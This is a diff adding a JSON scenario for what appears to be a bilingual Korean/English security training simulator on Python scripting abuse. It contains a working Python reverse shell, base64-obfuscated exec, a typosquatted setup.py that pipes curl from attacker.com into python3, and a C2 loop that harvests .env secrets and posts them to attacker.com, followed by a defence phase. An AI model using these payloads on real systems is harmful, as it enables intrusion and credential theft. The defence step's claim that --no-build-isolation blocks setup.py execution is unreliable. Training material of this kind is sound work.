@@ -1,0 +1,139 @@
+{
+  "id": "T1059.006",
+  "title": "Python 스크립팅 악용 시뮬레이션",
+  "titleEn": "Python Scripting Exploitation Simulation",
+  "duration": 6,
+  "phases": [
+    { "label": "🐍 리버스 쉘", "labelEn": "🐍 Reverse Shell", "steps": [0] },
+    { "label": "📦 악성 패키지", "labelEn": "📦 Malicious Package", "steps": [1] },
+    { "label": "🎯 C2 에이전트", "labelEn": "🎯 C2 Agent", "steps": [2] },
+    { "label": "🔍 탐지 & 방어", "labelEn": "🔍 Detection & Defense", "steps": [3] }
+  ],
+  "topoNodes": [
+    { "id": "attacker", "label": "Attacker\n(C2 Server)", "x": 50, "y": 80 },
+    { "id": "pypi", "label": "PyPI\n(Typosquat)", "x": 200, "y": 30 },
+    { "id": "victim", "label": "Developer PC\n(python3)", "x": 200, "y": 130 },
+    { "id": "internal", "label": "Internal\nAPI Server", "x": 370, "y": 80 },
+    { "id": "data", "label": "Database\n(Exfil)", "x": 500, "y": 80 }
+  ],
+  "topoEdges": [
+    { "from": "attacker", "to": "pypi", "minStep": 1 },
+    { "from": "pypi", "to": "victim", "minStep": 1 },
+    { "from": "attacker", "to": "victim", "minStep": 0 },
+    { "from": "victim", "to": "internal", "minStep": 2 },
+    { "from": "internal", "to": "data", "minStep": 2 }
+  ],
+  "desktopIcons": [
+    { "name": "python3", "icon": "🐍" },
+    { "name": "pip", "icon": "📦" },
+    { "name": "PyInstaller", "icon": "📀" },
+    { "name": "C2 Agent", "icon": "🎯" },
+    { "name": "SIEM", "icon": "📊" }
+  ],
+  "steps": [
+    {
+      "cmd": "# Python 리버스 쉘\npython3 -c '\nimport socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((\"10.0.0.1\",4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call([\"/bin/bash\",\"-i\"])\n'\n\n# Base64 인코딩 실행\npython3 -c 'import base64;exec(base64.b64decode(\"aW1wb3J0IG9zO29zLnN5c3RlbSgnaWQn\"))'",
+      "out": "[Python 리버스 쉘]\nConnected to 10.0.0.1:4444\nShell session established\n\n$ id\nuid=1000(developer) gid=1000(developer)\n$ python3 --version\nPython 3.9.7\n\n[Base64 실행]\n→ base64 디코딩: import os;os.system('id')\n→ uid=1000(developer)\n\n⚠️ 파일 생성 없이 인메모리 리버스 쉘 실행",
+      "def": "[EDR] Python reverse shell detected — socket connection to external IP, subprocess spawning /bin/bash",
+      "defAction": "Tool: python3 -c (inline execution)\nMethod: socket + subprocess reverse shell\nBase64: In-memory code execution\nUser: developer (uid=1000)\nConnection: 10.0.0.1:4444\nRisk Level: Critical\nAction: Monitor python3 -c usage, restrict socket access",
+      "desc": "python3 -c로 파일 생성 없이 인메모리 리버스 쉘을 실행합니다. Base64 인코딩으로 코드를 난독화하여 탐지를 우회합니다.",
+      "descEn": "Execute in-memory reverse shell with python3 -c without file creation. Obfuscate code with Base64 encoding to evade detection.",
+      "stepTitle": "Python 인메모리 리버스 쉘",
+      "stepTitleEn": "Python In-Memory Reverse Shell",
+      "feynman": "통역사(Python 인터프리터)에게 암호(Base64)로 된 지시서를 주면, 통역사가 해독해서 실행합니다. 서류(파일)는 남기지 않고 구두(인메모리)로만 처리합니다.",
+      "feynmanEn": "Give the interpreter (Python) encrypted instructions (Base64). The interpreter decodes and executes them. No paperwork (files) — everything handled verbally (in-memory).",
+      "expert": "python3 -c는 명령줄에서 직접 코드를 실행합니다. os.dup2()는 파일 디스크립터를 복제하여 stdin/stdout/stderr를 소켓으로 리다이렉트합니다. exec()와 eval()은 동적 코드 실행을 가능하게 하여 EDR 시그니처를 우회합니다.",
+      "expertEn": "python3 -c executes code directly from command line. os.dup2() duplicates file descriptors to redirect stdin/stdout/stderr to socket. exec()/eval() enable dynamic code execution bypassing EDR signatures.",
+      "defTooltip": "🔐 Python 인메모리 리버스 쉘!",
+      "defTooltipEn": "🔐 Python in-memory reverse shell!",
+      "hackerLog": { "title": "shell.log", "lines": ["[15:00:00] python3 -c 실행", "[15:00:02] 소켓 연결", "[15:00:03] 리버스 쉘 활성화", "[15:00:05] Base64 코드 실행"] },
+      "terms": [
+        { "term": "exec()", "def": "Python 내장 함수, 문자열을 Python 코드로 동적 실행" },
+        { "term": "os.dup2()", "def": "파일 디스크립터 복제, stdin/stdout을 소켓으로 리다이렉트하여 원격 쉘 구현" }
+      ]
+    },
+    {
+      "cmd": "# 타이포스쿼팅 악성 PyPI 패키지\npip install reqeusts  # requests의 오타\n\n# setup.py 내부 악성 코드\n# import os\n# os.system('curl http://attacker.com/agent.py | python3')\n\n# 의존성 혼동 공격\npip install company-internal-lib==99.0.0  # 내부 패키지명과 동일",
+      "out": "[타이포스쿼팅 패키지]\nCollecting reqeusts\n  Downloading reqeusts-1.0.0.tar.gz\n  Running setup.py install...\n\n[setup.py 악성 코드 실행]\n→ curl http://attacker.com/agent.py | python3\n→ C2 에이전트 다운로드 + 실행\n→ /tmp/.agent.py 설치\n\n[의존성 혼동]\ncompany-internal-lib 99.0.0 설치\n→ 내부 패키지 대신 공격자 패키지 설치\n→ __init__.py에서 자격증명 수집\n\n⚠️ 2개 악성 패키지 설치, C2 에이전트 활성화",
+      "def": "[SIEM] Suspicious pip install — typosquatted package 'reqeusts' installed, external script execution via setup.py",
+      "defAction": "Tool: pip install (typosquatting)\nPackage 1: reqeusts (setup.py RCE)\nPackage 2: company-internal-lib (dependency confusion)\nC2 Agent: /tmp/.agent.py installed\nCredentials: collected by __init__.py\nRisk Level: Critical\nAction: Remove packages, scan for backdoors, use internal PyPI",
+      "desc": "타이포스쿼팅(reqeusts) 패키지 설치 시 setup.py의 악성 코드가 실행되어 C2 에이전트가 설치됩니다. 의존성 혼동 공격으로 내부 패키지도 탈취됩니다.",
+      "descEn": "Typosquatted package (reqeusts) executes malicious setup.py installing C2 agent. Dependency confusion attack hijacks internal package.",
+      "stepTitle": "PyPI 타이포스쿼팅 + 의존성 혼동",
+      "stepTitleEn": "PyPI Typosquatting + Dependency Confusion",
+      "feynman": "진짜 택배(requests)와 거의 같은 이름의 가짜 택배(reqeusts)를 보냅니다. 택배를 열면(setup.py 실행) 안에 도청 장치(C2 에이전트)가 자동으로 설치됩니다.",
+      "feynmanEn": "Send a fake delivery (reqeusts) with almost identical name to the real one (requests). Opening it (setup.py) automatically installs a listening device (C2 agent).",
+      "expert": "타이포스쿼팅은 인기 패키지와 유사한 이름으로 악성 패키지를 등록합니다. 의존성 혼동(Dependency Confusion)은 내부 패키지명과 같은 이름으로 공개 PyPI에 높은 버전을 등록하여 설치를 가로챕니다. pip install --require-hashes로 해시 검증이 가능합니다.",
+      "expertEn": "Typosquatting registers malicious packages with names similar to popular ones. Dependency Confusion registers high version numbers on public PyPI matching internal package names. pip install --require-hashes enables hash verification.",
+      "defTooltip": "🔐 악성 패키지 2개 설치!",
+      "defTooltipEn": "🔐 2 malicious packages installed!",
+      "hackerLog": { "title": "pypi.log", "lines": ["[15:05:00] reqeusts 패키지 설치", "[15:05:10] setup.py 악성 코드 실행", "[15:05:15] C2 에이전트 설치", "[15:05:20] 의존성 혼동 패키지 설치"] },
+      "terms": [
+        { "term": "Typosquatting", "def": "인기 패키지와 유사한 이름(오타)으로 악성 패키지를 배포하는 공급망 공격" },
+        { "term": "Dependency Confusion", "def": "내부 패키지명을 공개 저장소에 높은 버전으로 등록하여 설치를 가로채는 공격" }
+      ]
+    },
+    {
+      "cmd": "# Python C2 에이전트 활동\nimport requests, json, os, subprocess\n\n# C2 서버에서 명령 수신\nwhile True:\n    cmd = requests.get('https://attacker.com/cmd').text\n    result = subprocess.check_output(cmd, shell=True)\n    requests.post('https://attacker.com/result', data=result)\n\n# 내부 API 키 수집\nfor f in os.walk('/home'):\n    for name in f[2]:\n        if '.env' in name or 'config' in name:\n            content = open(os.path.join(f[0],name)).read()\n            if 'API_KEY' in content or 'SECRET' in content:\n                requests.post('https://attacker.com/exfil', data=content)",
+      "out": "[C2 에이전트 활동]\n명령 수신 → 실행 → 결과 전송 루프\n  cmd: 'cat /etc/passwd' → 전송 완료\n  cmd: 'ls -la /opt/app/' → 전송 완료\n  cmd: 'env' → 환경변수 전송 완료\n\n[자격증명 수집]\n/home/developer/.env:\n  AWS_ACCESS_KEY_ID=AKIAI...\n  DATABASE_URL=postgres://...\n\n/opt/app/config/production.json:\n  api_key: sk-proj-abc...\n  stripe_secret: sk_live_...\n\n⚠️ C2 통신 + 4개 자격증명 탈취",
+      "def": "[SIEM] Python C2 communication — periodic HTTPS requests to suspicious domain, credential exfiltration detected",
+      "defAction": "Tool: Python requests + subprocess\nC2: HTTPS polling to attacker.com\nCommands: passwd, directory listing, env\nCredentials: AWS key, DB URL, API keys, Stripe\nExfiltration: HTTPS POST to C2\nRisk Level: Critical\nAction: Kill agent, rotate all credentials, block C2 domain",
+      "desc": "Python C2 에이전트가 주기적으로 명령을 수신하고 결과를 전송합니다. /home과 설정 파일에서 AWS 키, DB URL, API 키 4개를 탈취합니다.",
+      "descEn": "Python C2 agent polls for commands and sends results. Exfiltrate 4 credentials from /home and config files: AWS key, DB URL, API keys.",
+      "stepTitle": "C2 에이전트 + 자격증명 탈취",
+      "stepTitleEn": "C2 Agent + Credential Exfiltration",
+      "feynman": "스파이(C2 에이전트)가 본부(C2 서버)에서 지시를 받고, 건물의 금고(설정 파일)에서 열쇠(자격증명)를 복사하여 본부로 전송합니다. 정상 우편(HTTPS)처럼 보여 감시를 피합니다.",
+      "feynmanEn": "A spy (C2 agent) receives orders from HQ (C2 server), copies keys (credentials) from safes (config files), and sends them to HQ. Disguised as regular mail (HTTPS) to avoid surveillance.",
+      "expert": "Python의 requests 라이브러리로 HTTPS C2 통신을 구현하면 암호화된 정상 트래픽과 구분이 어렵습니다. subprocess.check_output()은 명령 실행 결과를 바이트로 반환합니다. JA3 핑거프린트로 Python requests의 TLS 패턴을 탐지할 수 있습니다.",
+      "expertEn": "Python requests over HTTPS makes C2 traffic indistinguishable from legitimate. subprocess.check_output() returns command output as bytes. JA3 fingerprinting can detect Python requests TLS patterns.",
+      "defTooltip": "🔐 C2 통신 + 4개 자격증명 탈취!",
+      "defTooltipEn": "🔐 C2 comms + 4 credentials stolen!",
+      "hackerLog": { "title": "c2.log", "lines": ["[15:10:00] C2 폴링 시작", "[15:10:05] 3개 명령 실행", "[15:10:15] .env 파일 수집", "[15:10:20] 4개 자격증명 탈취"] },
+      "terms": [
+        { "term": "C2 Agent", "def": "Command & Control 에이전트, 공격자 서버와 통신하며 명령 수신/결과 전송" },
+        { "term": "JA3", "def": "TLS 클라이언트 핑거프린팅 기법, Python/curl 등 클라이언트 유형 식별" }
+      ]
+    },
+    {
+      "cmd": "# Python 악용 방어\n# 내부 PyPI 미러 설정\npip config set global.index-url https://pypi.internal.corp/simple/\n\n# pip audit 취약점 스캔\npip-audit --strict\n\n# AppArmor Python 프로파일\naa-enforce /usr/bin/python3",
+      "out": "[내부 PyPI 미러]\n✅ 공개 PyPI 직접 접근 차단\n✅ 승인된 패키지만 내부 미러에 등록\n✅ 패키지 해시 검증 (--require-hashes)\n✅ setup.py 실행 차단 (--no-build-isolation)\n\n[pip audit]\n✅ 의존성 취약점 자동 스캔\n✅ CI/CD 파이프라인 통합\n✅ 타이포스쿼팅 탐지 규칙\n✅ requirements.txt 해시 고정\n\n[실행 제한]\n✅ AppArmor Python 프로파일 적용\n✅ python3 네트워크 아웃바운드 제한\n✅ /tmp 실행 차단 (noexec)\n✅ python3 -c 인라인 실행 감사\n\n[종합]\n✅ EDR Python 행위 탐지\n✅ JA3 핑거프린트 모니터링\n✅ 가상환경(venv) 필수 사용\n✅ 개발자 보안 교육",
+      "def": "[SIEM] Python defense deployed — internal PyPI, pip audit, AppArmor profile, JA3 monitoring",
+      "defAction": "Tool: Internal PyPI + pip audit + AppArmor + JA3\nPyPI: Internal mirror only, hash verification\nAudit: CI/CD integrated vulnerability scan\nAppArmor: Python network restrictions\nMonitoring: JA3 + EDR behavioral\nRisk Level: Low (with implementation)\nAction: Monthly pip audit, quarterly developer training",
+      "desc": "내부 PyPI 미러로 공급망을 통제하고, pip audit로 취약점을 스캔합니다. AppArmor로 Python 네트워크 접근을 제한하고 JA3로 C2 통신을 탐지합니다.",
+      "descEn": "Control supply chain with internal PyPI mirror, scan with pip audit. Restrict Python network with AppArmor, detect C2 with JA3 fingerprinting.",
+      "stepTitle": "내부 PyPI + pip audit + AppArmor",
+      "stepTitleEn": "Internal PyPI + pip audit + AppArmor",
+      "feynman": "4가지 대책: 1) 택배는 회사 우체국(내부 PyPI)을 통해서만 수령, 2) 모든 택배를 X-ray 검사(pip audit), 3) 통역사(Python)의 전화 사용 제한(AppArmor), 4) 의심스러운 전화 패턴 감시(JA3).",
+      "feynmanEn": "4 measures: 1) Receive packages only through company post office (internal PyPI), 2) X-ray all packages (pip audit), 3) Limit interpreter's (Python) phone use (AppArmor), 4) Monitor suspicious call patterns (JA3).",
+      "expert": "pip install --require-hashes는 패키지 해시를 검증하여 변조를 방지합니다. AppArmor 프로파일로 Python 프로세스의 파일/네트워크 접근을 제한할 수 있습니다. JA3 핑거프린트는 TLS ClientHello의 고유 패턴으로 Python requests 라이브러리를 식별합니다.",
+      "expertEn": "pip --require-hashes verifies package hashes to prevent tampering. AppArmor profiles restrict Python process file/network access. JA3 identifies Python requests by unique TLS ClientHello patterns.",
+      "defTooltip": "🔐 Python 방어 체계 완성!",
+      "defTooltipEn": "🔐 Python defense system complete!",
+      "hackerLog": { "title": "defense.log", "lines": ["[16:00:00] 내부 PyPI 미러 설정", "[16:05:00] pip audit CI/CD 통합", "[16:10:00] AppArmor 프로파일 적용", "[16:15:00] JA3 모니터링 활성화"] },
+      "terms": [
+        { "term": "AppArmor", "def": "Linux MAC 시스템, 프로세스별 파일/네트워크 접근 제한 프로파일" },
+        { "term": "pip audit", "def": "Python 패키지 의존성 취약점 자동 스캔 도구" }
+      ]
+    }
+  ],
+  "processTree": {
+    "name": "python3",
+    "pid": 6000,
+    "children": [
+      {
+        "name": "socket (reverse shell)",
+        "pid": 6100,
+        "children": [
+          { "name": "/bin/bash -i", "pid": 6110, "children": [] }
+        ]
+      },
+      {
+        "name": "pip install reqeusts",
+        "pid": 6200,
+        "children": [
+          { "name": "setup.py (malicious)", "pid": 6210, "children": [] }
+        ]
+      }
+    ]
+  }
+}
